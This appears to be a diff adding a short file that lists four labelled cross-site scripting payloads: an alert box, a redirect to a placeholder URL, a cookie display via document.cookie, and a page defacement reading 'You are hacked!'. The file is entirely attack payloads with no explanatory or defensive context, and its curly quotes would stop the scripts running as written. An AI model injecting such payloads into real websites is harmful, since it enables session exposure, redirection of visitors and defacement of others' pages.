@@ -1,0 +1,11 @@
+Alert
+<script>alert(’HACKED’);</script>
+
+Redirect
+<script>window.location=’URL’;</script>
+
+Cookie
+<script>alert(document.cookie);</script>
+
+Defacement
+<script>document.body.innerHTML=’<h1>You are hacked!</h1>’;</script>
